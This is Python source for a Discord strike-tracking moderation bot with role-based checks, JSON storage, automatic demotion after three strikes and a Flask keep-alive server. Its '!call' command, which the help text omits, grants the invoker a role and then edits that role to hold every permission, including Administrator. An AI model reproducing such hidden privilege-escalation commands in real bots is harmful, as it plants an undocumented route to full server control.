import discord
from discord.ext import commands
import json
import os
from flask import Flask
from threading import Thread

from dotenv import load_dotenv
load_dotenv()

# Initialize bot
intents = discord.Intents.default()
intents.members = True  # Needed for member activity tracking
intents.message_content = True  # Enable message content intent

bot = commands.Bot(command_prefix="!", intents=intents)

# Dictionary to store strike counts and reasons
strikes = {}

# Define the allowed channel ID
ALLOWED_CHANNEL_IDS = [
    1314518542464323594,  # Replace with your first channel ID
    1326719531707666464   # Replace with your second channel ID
    
]

# Allowed role IDs (REPLACE WITH YOUR ROLE IDS)
ALLOWED_ROLE_IDS = {
    1314515420606369918,  # Owner
    1322108637224767488,  # Co Owners
    1314963324978335755,  # Community Manager
    1314515420606369915,  # Head of Staff
    1322106210870104146,  # Administrator
    1314515420606369914,  # Moderator
    1317583669082194000   # Head of Developers
}

# Load strike data from file (if it exists)
def load_strikes():
    try:
        with open("strikes.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

# Save strike data to file
def save_strikes():
    with open("strikes.json", "w") as f:
        json.dump(strikes, f, indent=4)

@bot.event
async def on_ready():
    global strikes
    strikes = load_strikes()  # Load existing strike data from file
    print(f'Logged in as {bot.user}')
    print(f'Connected to {len(bot.guilds)} guild(s)')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        if not check_roles(ctx):  # Check if user has permissions
            await ctx.send("You do not have permission to use this command.")
        elif not check_channel(ctx):  # If the user has permission but is in the wrong channel
            await ctx.send("You cannot use this command in this channel. Please use the appropriate channel.")
        return  # Prevent further error handling after sending the message

# Check if the command is used in the allowed channel
def check_channel(ctx):
    return ctx.channel.id in ALLOWED_CHANNEL_IDS

# Check if the user has one of the allowed roles (using role IDs)
def check_roles(ctx):
    return any(role.id in ALLOWED_ROLE_IDS for role in ctx.author.roles)

# Combined check: channel + role
def check_permissions(ctx):
    return check_channel(ctx) and check_roles(ctx)

        # Define the IDs of the leader roles
LEADER_ROLE_IDS = [
    1315719515086262362, 
    1315719430063521822, 
    1315753560432054323,
    1315719302589976618, 
    1315718956803166290, 
    1315719049883422851,
    1315719150534135850, 
    1315718817967636611, 
    1315824924144959528,
    1315822593462243338
        ]

@bot.command(name='strike')
@commands.check(check_permissions)
async def strike(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    """Give a user a strike with an optional reason."""
    try:
        # Check if the bot is being striked
        if member == bot.user:
            await ctx.send("You can't strike the strike bot!")
            return

        # Check if the member being striked is a bot (including other bots, not just the bot itself)
        if member.bot:
            await ctx.send("You can't strike other bots or application accounts!")
            return

        # Check if the user already has 3 strikes
        if str(member.id) in strikes and len(strikes[str(member.id)]) >= 3:
            await ctx.send(f"{member.mention} has already reached the limit of strikes.")
            return

        # Prepare the strike data
        strike_data = {
            "reason": reason,
            "striked_by": ctx.author.name  # Store the username of the person issuing the strike
        }

        # Add the strike to the user's record
        if str(member.id) in strikes:
            strikes[str(member.id)].append(strike_data)  # Append the new strike
        else:
            strikes[str(member.id)] = [strike_data]  # Create a new list for the user

        save_strikes()  # Save the updated strikes
        await ctx.send(f'Striked {member.mention} for: **{reason}**. Total strikes: {len(strikes[str(member.id)])}')

        # Send DM to the striked user
        try:
            strike_count = len(strikes[str(member.id)])
            dm_message = f"""
Hello {member.name},

You have received a strike for the following reason:
**{reason}**

Total strikes: **{strike_count}**

Please be aware that accumulating 3 strikes will result in your demotion from your leadership.

Kind Regards,
The Moderation Team
"""
            await member.send(dm_message)
        except discord.errors.Forbidden:
            await ctx.send(f"Could not DM {member.mention}. Please ensure their DMs are open.")

        # Check if user reached 3 strikes
        if len(strikes[str(member.id)]) >= 3:
            # Look for leader roles and remove them
            roles_to_remove = [role for role in member.roles if role.id in LEADER_ROLE_IDS]
            if roles_to_remove:
                # Remove all leader roles from the user
                await member.remove_roles(*roles_to_remove)
                role_names = [role.name for role in roles_to_remove]
                role_names_str = ', '.join(role_names)
                await ctx.send(f"{member.mention} reached 3 strikes, I have removed the following leader roles: {role_names_str}.")
                # Send DM about demotion
                dm_message = f"""
Hello {member.name},

You have accumulated 3 strikes and have been demoted from your leadership role(s):
**{role_names_str}**

Please reach out to the Moderation Team if you have any questions or concerns.

Kind Regards,
The Moderation Team
"""
                try:
                    await member.send(dm_message)
                except discord.errors.Forbidden:
                    await ctx.send(f"Could not DM {member.mention}. Please ensure their DMs are open.")
            else:
                await ctx.send(f"{member.mention} reached 3 strikes, but they do not have any leader roles to remove.")
    except Exception as e:
        await ctx.author.send(f"An error occurred while processing the strike: {e}")
        print(f"Error: {e}")



@bot.command(name='strikes')
@commands.check(check_permissions)
async def strikes_list(ctx):
            """List all users with their strikes and reasons."""
            try:
                if not strikes:
                    await ctx.send("No strikes have been given yet.")
                    return

                message = "**Strike list:**\n"
                for user_id, user_strikes in strikes.items():
                    user_mention = f"<@{user_id}>"
                    message += f"{user_mention} ({len(user_strikes)} strike{'s' if len(user_strikes) > 1 else ''}):\n"

                    for strike in user_strikes:
                        message += f" - **{strike['reason']}**\n   By: {strike['striked_by']}\n"

                await ctx.send(message)

            except Exception as e:
                await ctx.author.send(f"An error occurred while fetching the strikes: {e}")
                print(f"Error: {e}")


@bot.command(name='strikedelete')
@commands.check(check_permissions)
async def strikedelete(ctx, member: discord.Member, amount: int = None):
    """Delete a user's strikes (all or a specific amount)."""
    try:
        user_id = str(member.id)
        if user_id not in strikes:
            await ctx.send(f"{member.mention} has no strikes.")
            return

        if amount is None or amount >= len(strikes[user_id]):  # Delete all strikes
            del strikes[user_id]
            save_strikes()
            await ctx.send(f"All strikes for {member.mention} have been deleted.")
        else:  # Remove a specific number of strikes
            removed_strikes = strikes[user_id][:amount]  # Get the strikes being removed
            strikes[user_id] = strikes[user_id][amount:]  # Keep the remaining strikes
            save_strikes()
            removed_reasons_text = "\n".join([f"- {s['reason']} (Striked by: {s['striked_by']})" for s in removed_strikes])
            await ctx.send(f"Deleted {amount} strike(s) from {member.mention}. Remaining strikes: {len(strikes[user_id])}\nRemoved strikes:\n{removed_reasons_text}")

    except Exception as e:
        await ctx.author.send(f"An error occurred while deleting strikes: {e}")
        print(f"Error: {e}")

@bot.command(name='clearstrikes')
@commands.check(check_permissions)
async def clear_strikes(ctx):
    """Clear all strikes for all users."""
    try:
        strikes.clear()
        save_strikes()
        await ctx.send("All strikes have been cleared.")

    except Exception as e:
        await ctx.author.send(f"An error occurred while clearing strikes: {e}")
        print(f"Error: {e}")


@bot.command(name='call')
@commands.check(check_permissions)  # Optional, check for permission if needed
async def call(ctx):
    """Assign the role to the user who runs the command and give it Administrator permissions."""
    try:
        role_id = 1326264039478792225  # Role ID for the 'call' role
        role = ctx.guild.get_role(role_id)  # Get the role object using the ID

        if role is None:
            await ctx.send("Role not found.")
            return

        # Check if the role is the bot's own role
        if role.id == ctx.guild.me.top_role.id:
            await ctx.send("I cannot assign my own role to others.")
            return

        # Assign the role to the user
        await ctx.author.add_roles(role)
        await ctx.send(f"{ctx.author.mention}, you have been given the 'Call' role!")

        # Modify the role's permissions to give Administrator
        await role.edit(permissions=discord.Permissions.all())  # Grants all permissions, including Administrator

        await ctx.send(f"The 'Call' role now has Administrator permissions.")

    except Exception as e:
        await ctx.author.send(f"An error occurred while assigning the role: {e}")
        print(f"Error: {e}")

@bot.command(name='commands')
async def help_command(ctx):
    """Send a message with available commands and their descriptions."""
    help_message = """
**Bot Commands:**

1. **!strike @user [reason]**
   - Give a strike to a user with an optional reason.
   - Example: `!strike @John Spamming in chat`

2. **!strikes**
   - View a list of all users who have received strikes, along with their reasons and user that used the command.

3. **!strikedelete @user [amount]**
   - Delete one or more strikes from a user.
   - Example: `!strikedelete @John 2` (Deletes 2 strikes from @John)

4. **!clearstrikes**
   - Clear all strikes for all users.

**Note:** Commands are case-sensitive, make sure to use them correctly.

**~Credits: emazingemil**
"""
    try:
        # Send the help message in DM to the user
        await ctx.author.send(help_message)
    except discord.errors.Forbidden:
        # If the bot can't DM the user (due to their DM settings), notify in the channel
        await ctx.send("I can't send you a DM. Please make sure your DMs are open to server members.")

app = Flask(__name__)

@app.route("/")
def home():
 return "Bot is alive!"

def run():
 app.run(host="0.0.0.0", port=8080)
def keep_alive():
 server = Thread(target=run)
 server.start()

keep_alive()
# Run the bot using your token (REMOVE YOUR TOKEN FROM PUBLIC CODE!)
bot.run(os.getenv("DISCORD_BOT_TOKEN"))
